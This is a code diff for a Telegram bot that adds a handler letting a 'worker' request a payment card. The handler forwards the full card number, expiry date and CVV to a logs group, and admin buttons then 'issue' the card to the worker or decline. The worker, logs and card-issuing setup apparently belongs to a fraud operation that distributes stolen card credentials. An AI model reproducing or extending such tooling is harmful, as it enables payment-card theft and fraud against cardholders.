@@ -126,6 +126,39 @@ main.action("chats", (ctx) => {
     .catch((err) => console.log(err));
 });
 
+main.action(/get_card_worker:(.*):(.*):(.*)_admin/, (ctx) => {
+  try {
+    ctx.answerCbQuery("Вы запросили карту, ожидайте...");
+    ctx.editMessageReplyMarkup(Markup.inlineKeyboard(Markup.removeKeyboard()));
+    ctx.telegram
+      .sendMessage(
+        ctx.state.bot.logsGroupId,
+        `Воркер запросил данные карты:
+
+👨🏻‍💻 Воркер: <b><a href="tg://user?id=${ctx.from.id}">${ctx.from.username}</a></b>
+
+💳 Номер карты: <b>${ctx.match[1]}</b>
+📅 Срок действия: <b>${ctx.match[2]}</b>
+🔒 CVV: <b>${ctx.match[3]}</b>`,
+        {
+          parse_mode: "HTML",
+          reply_markup: Markup.inlineKeyboard([
+            [
+              Markup.callbackButton(
+                "Выдать карту",
+                `admin_send_card_worker_${ctx.match[1]}:${ctx.match[2]}:${ctx.match[3]}:${ctx.from.id}_ok`
+              ),
+              Markup.callbackButton("Отклонить", `admin_cancel_${ctx.from.id}_get_card`),
+            ],
+          ]),
+        }
+      )
+      .catch((err) => err);
+  } catch (err) {
+    console.log(err);
+  }
+});
+
 main.action("referral", referral);
 
 main.action("whatsapp", (ctx) => ctx.scene.enter("whatsapp_link"));
